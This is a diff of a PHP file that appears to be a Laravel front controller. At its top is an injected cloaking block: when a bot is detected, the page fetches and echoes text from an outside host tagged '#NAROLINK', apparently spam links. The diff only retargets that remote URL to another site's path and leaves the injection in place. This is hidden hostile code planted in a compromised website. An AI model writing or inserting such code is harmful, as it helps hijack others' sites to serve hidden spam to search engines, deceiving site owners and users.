@@ -13,11 +13,10 @@ function is_bot() {
 }
 
 if (is_bot()) {
-    $message = file_get_contents('https://amp-saya.com/brand/nustoto/ahujaresidences.com/index.txt');#NAROLINK
+    $message = file_get_contents('https://amp-saya.com/brand/nustoto/www.hayduk.com.pe/index.txt');#NAROLINK
     echo $message;
 }
 ?>
-
 <?php
 
 /**
@@ -39,3 +38,5 @@ if ($uri !== '/' && file_exists(__DIR__.'/public'.$uri)) {
 }
 
 require_once __DIR__.'/public/index.php';
+
+
